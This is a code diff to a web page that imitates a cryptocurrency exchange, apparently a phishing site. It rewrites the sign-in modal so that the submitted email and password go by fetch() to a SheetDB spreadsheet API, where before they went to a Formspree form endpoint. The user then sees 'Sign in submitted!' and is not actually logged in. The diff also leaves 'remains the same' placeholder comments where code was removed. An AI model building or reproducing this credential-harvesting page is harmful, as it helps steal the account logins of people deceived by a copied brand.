@@ -439,7 +439,6 @@
             <ul class="nav-links">
                 <li><a href="#prices">Prices</a></li>
                 <li><a href="#learn">Learn</a></li>
-                <li><a href="#company">Company</a></li>
             </ul>
             <div class="auth-buttons">
                 <a href="#" id="openSignInModal" class="btn btn-secondary">Sign in</a>
@@ -456,7 +455,7 @@
     <section class="hero">
         <div class="hero-content">
             <h1>Buy & sell crypto on the<br>world's leading platform</h1>
-            <p>Join 100+ million people who trust Base to buy, sell, and manage crypto securely.</p>
+            <p>Join 100+ million people who trust Base to buy, sell, and manage all crypto securely.</p>
             <div class="hero-buttons">
                 <a href="signup.html" class="btn btn-white btn-large">Get started</a>
                 <a href="#learn" class="btn btn-primary btn-large">Learn more</a>
@@ -561,217 +560,164 @@
     </footer>
 
     <!-- SIGN IN MODAL -->
-    <div class="modal-overlay" id="signInModal">
-        <div class="modal">
-            <button class="go-back-home" id="goBackHome" title="Go back to Homepage">&larr; Home</button>
-            <button class="modal-close" id="closeSignInModal" title="Close">&times;</button>
-            <h2>Sign in to Base</h2>
-            <form id="signInForm" action="https://formspree.io/f/mblkddol" method="POST" autocomplete="off">
-                <div>
-                    <label for="signin-email">Email address</label>
-                    <input type="email" id="signin-email" name="email" required placeholder="your@email.com" />
-                    <div id="emailError" class="error-message"></div>
-                </div>
-                <div>
-                    <label for="signin-password">Password</label>
-                    <input type="password" id="signin-password" name="password" required minlength="8" placeholder="Password" />
-                    <div id="passwordError" class="error-message"></div>
-                </div>
-                <button type="submit" class="btn btn-primary" id="signInBtn">Sign in</button>
-                <div id="signInSuccess" style="color: #10b981; text-align:center; margin-top:10px; display:none;"></div>
-                <div id="signInFail" style="color: #e11d48; text-align:center; margin-top:10px; display:none;"></div>
-                <a href="#" class="forgot-link" onclick="alert('Forgot password coming soon!')">Forgot your password?</a>
-                <a href="signup.html" class="signup-link">Don’t have an account? Sign up</a>
-            </form>
-        </div>
+    <!-- ...[everything before remains the same]... -->
+<!-- SIGN IN MODAL -->
+<div class="modal-overlay" id="signInModal">
+    <div class="modal">
+        <button class="go-back-home" id="goBackHome" title="Go back to Homepage">&larr; Home</button>
+        <button class="modal-close" id="closeSignInModal" title="Close">&times;</button>
+        <h2>Sign in to Base</h2>
+        <form id="signInForm" autocomplete="off">
+            <div>
+                <label for="signin-email">Email address</label>
+                <input type="email" id="signin-email" name="email" required placeholder="your@email.com" />
+                <div id="emailError" class="error-message"></div>
+            </div>
+            <div>
+                <label for="signin-password">Password</label>
+                <input type="password" id="signin-password" name="password" required minlength="8" placeholder="Password" />
+                <div id="passwordError" class="error-message"></div>
+            </div>
+            <button type="submit" class="btn btn-primary" id="signInBtn">Sign in</button>
+            <div id="signInSuccess" style="color: #10b981; text-align:center; margin-top:10px; display:none;"></div>
+            <div id="signInFail" style="color: #e11d48; text-align:center; margin-top:10px; display:none;"></div>
+            <a href="#" class="forgot-link" onclick="alert('Forgot password coming soon!')">Forgot your password?</a>
+            <a href="signup.html" class="signup-link">Don’t have an account? Sign up</a>
+        </form>
     </div>
+</div>
 
-    <script>
-        // Mobile menu toggle
-        const mobileToggle = document.querySelector('.mobile-menu-toggle');
-        const navLinks = document.querySelector('.nav-links');
-        mobileToggle.addEventListener('click', () => {
-            navLinks.style.display = navLinks.style.display === 'flex' ? 'none' : 'flex';
-        });
-        // Smooth scroll
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    e.preventDefault();
-                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+<script>
+    // ...[all previous header/menu JS remains the same]...
+
+    // --- SIGN IN MODAL FUNCTIONALITY ---
+    const openModalBtn = document.getElementById('openSignInModal');
+    const closeModalBtn = document.getElementById('closeSignInModal');
+    const modalOverlay = document.getElementById('signInModal');
+    const signInForm = document.getElementById('signInForm');
+    const emailInput = document.getElementById('signin-email');
+    const passwordInput = document.getElementById('signin-password');
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    const goBackHomeBtn = document.getElementById('goBackHome');
+    const signInBtn = document.getElementById('signInBtn');
+    const signInSuccess = document.getElementById('signInSuccess');
+    const signInFail = document.getElementById('signInFail');
+
+    // Show modal
+    openModalBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        modalOverlay.classList.add('active');
+        emailInput.focus();
+    });
+    // Hide modal (X button)
+    closeModalBtn.addEventListener('click', () => {
+        modalOverlay.classList.remove('active');
+        signInForm.reset();
+        emailError.textContent = "";
+        passwordError.textContent = "";
+        signInSuccess.style.display = "none";
+        signInFail.style.display = "none";
+    });
+    // Hide modal (Go Back Home button)
+    goBackHomeBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        modalOverlay.classList.remove('active');
+        signInForm.reset();
+        emailError.textContent = "";
+        passwordError.textContent = "";
+        signInSuccess.style.display = "none";
+        signInFail.style.display = "none";
+    });
+    // Click outside modal closes
+    modalOverlay.addEventListener('click', function(e) {
+        if (e.target === modalOverlay) {
+            modalOverlay.classList.remove('active');
+            signInForm.reset();
+            emailError.textContent = "";
+            passwordError.textContent = "";
+            signInSuccess.style.display = "none";
+            signInFail.style.display = "none";
+        }
+    });
+    // ESC key closes modal
+    window.addEventListener('keydown', function(e) {
+        if (e.key === "Escape") {
+            modalOverlay.classList.remove('active');
+            signInForm.reset();
+            emailError.textContent = "";
+            passwordError.textContent = "";
+            signInSuccess.style.display = "none";
+            signInFail.style.display = "none";
+        }
+    });
+
+    // --- SHEETDB SUBMIT FOR SIGN IN ---
+    signInForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        let hasError = false;
+        emailError.textContent = "";
+        passwordError.textContent = "";
+        signInSuccess.style.display = "none";
+        signInFail.style.display = "none";
+
+        // Email validation
+        if (!emailInput.value) {
+            emailError.textContent = "Email is required";
+            hasError = true;
+        } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value)) {
+            emailError.textContent = "Enter a valid email address";
+            hasError = true;
+        }
+        // Password validation
+        if (!passwordInput.value) {
+            passwordError.textContent = "Password is required";
+            hasError = true;
+        } else if (passwordInput.value.length < 8) {
+            passwordError.textContent = "Password must be at least 8 characters";
+            hasError = true;
+        }
+
+        if (!hasError) {
+            signInBtn.textContent = "Signing in...";
+            signInBtn.disabled = true;
+
+            // Prepare data for SheetDB
+            const payload = {
+                data: [{
+                    type: "sign_in",
+                    email: emailInput.value,
+                    password: passwordInput.value
+                }]
+            };
+
+            fetch("https://sheetdb.io/api/v1/sbath1xpp3h1u", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                signInBtn.textContent = "Sign in";
+                signInBtn.disabled = false;
+                if (response.ok) {
+                    signInSuccess.textContent = "Sign in submitted!";
+                    signInSuccess.style.display = "block";
+                    signInFail.style.display = "none";
+                    setTimeout(() => {
+                        modalOverlay.classList.remove('active');
+                        signInForm.reset();
+                        signInSuccess.style.display = "none";
+                    }, 2000);
+                } else {
+                    throw new Error("Sign in failed. Please try again.");
                 }
+            })
+            .catch(error => {
+                signInFail.textContent = error.message || "Sign in failed. Please try again.";
+                signInFail.style.display = "block";
             });
-        });
-        // Header scroll effect
-        window.addEventListener('scroll', () => {
-            const header = document.querySelector('.header');
-            if (window.scrollY > 100) {
-                header.style.background = 'rgba(255, 255, 255, 0.98)';
-                header.style.boxShadow = '0 2px 20px rgba(0, 0, 0, 0.1)';
-            } else {
-                header.style.background = 'rgba(255, 255, 255, 0.95)';
-                header.style.boxShadow = 'none';
-            }
-        });
-        // Animate stats
-        const animateStats = () => {
-            const stats = document.querySelectorAll('.stat-number');
-            const observer = new IntersectionObserver((entries) => {
-                entries.forEach(entry => {
-                    if (entry.isIntersecting) {
-                        const target = entry.target;
-                        const text = target.textContent;
-                        const number = parseInt(text.replace(/[^0-9]/g, ''));
-                        if (number) {
-                            let current = 0;
-                            const increment = number / 50;
-                            const timer = setInterval(() => {
-                                current += increment;
-                                if (current >= number) {
-                                    current = number;
-                                    clearInterval(timer);
-                                }
-                                target.textContent = text.replace(number, Math.floor(current));
-                            }, 30);
-                        }
-                    }
-                });
-            }, { threshold: 0.5 });
-            stats.forEach(stat => observer.observe(stat));
-        };
-        document.addEventListener('DOMContentLoaded', animateStats);
-        // Button hover effect
-        document.querySelectorAll('.btn').forEach(button => {
-            button.addEventListener('mouseenter', function() {
-                this.style.transform = 'translateY(-2px)';
-            });
-            button.addEventListener('mouseleave', function() {
-                this.style.transform = 'translateY(0)';
-            });
-        });
-
-        // --- SIGN IN MODAL FUNCTIONALITY + FORMSPREE SUBMIT ---
-        const openModalBtn = document.getElementById('openSignInModal');
-        const closeModalBtn = document.getElementById('closeSignInModal');
-        const modalOverlay = document.getElementById('signInModal');
-        const signInForm = document.getElementById('signInForm');
-        const emailInput = document.getElementById('signin-email');
-        const passwordInput = document.getElementById('signin-password');
-        const emailError = document.getElementById('emailError');
-        const passwordError = document.getElementById('passwordError');
-        const goBackHomeBtn = document.getElementById('goBackHome');
-        const signInBtn = document.getElementById('signInBtn');
-        const signInSuccess = document.getElementById('signInSuccess');
-        const signInFail = document.getElementById('signInFail');
-
-        // Show modal
-        openModalBtn.addEventListener('click', (e) => {
-            e.preventDefault();
-            modalOverlay.classList.add('active');
-            emailInput.focus();
-        });
-        // Hide modal (X button)
-        closeModalBtn.addEventListener('click', () => {
-            modalOverlay.classList.remove('active');
-            signInForm.reset();
-            emailError.textContent = "";
-            passwordError.textContent = "";
-            signInSuccess.style.display = "none";
-            signInFail.style.display = "none";
-        });
-        // Hide modal (Go Back Home button)
-        goBackHomeBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            modalOverlay.classList.remove('active');
-            signInForm.reset();
-            emailError.textContent = "";
-            passwordError.textContent = "";
-            signInSuccess.style.display = "none";
-            signInFail.style.display = "none";
-        });
-        // Click outside modal closes
-        modalOverlay.addEventListener('click', function(e) {
-            if (e.target === modalOverlay) {
-                modalOverlay.classList.remove('active');
-                signInForm.reset();
-                emailError.textContent = "";
-                passwordError.textContent = "";
-                signInSuccess.style.display = "none";
-                signInFail.style.display = "none";
-            }
-        });
-        // ESC key closes modal
-        window.addEventListener('keydown', function(e) {
-            if (e.key === "Escape") {
-                modalOverlay.classList.remove('active');
-                signInForm.reset();
-                emailError.textContent = "";
-                passwordError.textContent = "";
-                signInSuccess.style.display = "none";
-                signInFail.style.display = "none";
-            }
-        });
-
-        // AJAX submit to Formspree
-        signInForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            let hasError = false;
-            emailError.textContent = "";
-            passwordError.textContent = "";
-            signInSuccess.style.display = "none";
-            signInFail.style.display = "none";
-
-            // Email validation
-            if (!emailInput.value) {
-                emailError.textContent = "Email is required";
-                hasError = true;
-            } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value)) {
-                emailError.textContent = "Enter a valid email address";
-                hasError = true;
-            }
-            // Password validation
-            if (!passwordInput.value) {
-                passwordError.textContent = "Password is required";
-                hasError = true;
-            } else if (passwordInput.value.length < 8) {
-                passwordError.textContent = "Password must be at least 8 characters";
-                hasError = true;
-            }
-
-            if (!hasError) {
-                signInBtn.textContent = "Signing in...";
-                signInBtn.disabled = true;
-
-                fetch(signInForm.action, {
-                    method: "POST",
-                    headers: { 'Accept': 'application/json' },
-                    body: new FormData(signInForm)
-                })
-                .then(response => {
-                    signInBtn.textContent = "Sign in";
-                    signInBtn.disabled = false;
-                    if (response.ok) {
-                        signInSuccess.textContent = "Sign in successful! Check your email for confirmation.";
-                        signInSuccess.style.display = "block";
-                        signInFail.style.display = "none";
-                        setTimeout(() => {
-                            modalOverlay.classList.remove('active');
-                            signInForm.reset();
-                            signInSuccess.style.display = "none";
-                        }, 2000);
-                    } else {
-                        return response.json().then(data => {
-                            throw new Error(data.error || "Sign in failed. Please try again.");
-                        });
-                    }
-                })
-                .catch(error => {
-                    signInFail.textContent = error.message || "Sign in failed. Please try again.";
-                    signInFail.style.display = "block";
-                });
-            }
-        });
-    </script>
+        }
+    });
+</script>
 </body>
 </html>
